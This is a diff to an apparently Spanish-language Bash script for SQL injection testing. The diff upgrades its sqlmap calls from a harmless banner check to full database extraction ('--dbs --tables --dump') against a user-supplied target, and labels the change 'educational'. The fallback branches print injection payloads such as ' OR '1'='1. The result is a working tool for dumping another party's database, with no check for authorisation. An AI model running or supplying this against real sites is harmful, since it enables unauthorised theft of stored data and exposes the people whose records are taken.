@@ -27,16 +27,18 @@ then
     
     if [ ! -z "$POST_DATA" ]; then
         echo "[+] Probando inyección en parámetros POST: $POST_DATA"
-        # Con sqlmap instalado, lo ideal es usarlo directamente
         if command -v sqlmap &> /dev/null; then
-            sqlmap -u "$TARGET" --data="$POST_DATA" --batch --banner
+            # Agregamos flags de extracción para fines educativos
+            echo "[!] EXTRACCIÓN ACTIVADA: Buscando Tablas, Columnas y Datos..."
+            sqlmap -u "$TARGET" --data="$POST_DATA" --batch --banner --dbs --tables --dump
         else
             echo "    [TEST POST] ' OR '1'='1"
         fi
     else
         echo "[+] Probando inyección en parámetros de URL/Headers..."
         if command -v sqlmap &> /dev/null; then
-            sqlmap -u "$TARGET" --batch --banner
+            echo "[!] EXTRACCIÓN ACTIVADA: Buscando Tablas, Columnas y Datos..."
+            sqlmap -u "$TARGET" --batch --banner --dbs --tables --dump
         else
             echo "    [TEST GET] $TARGET?id='"
         fi
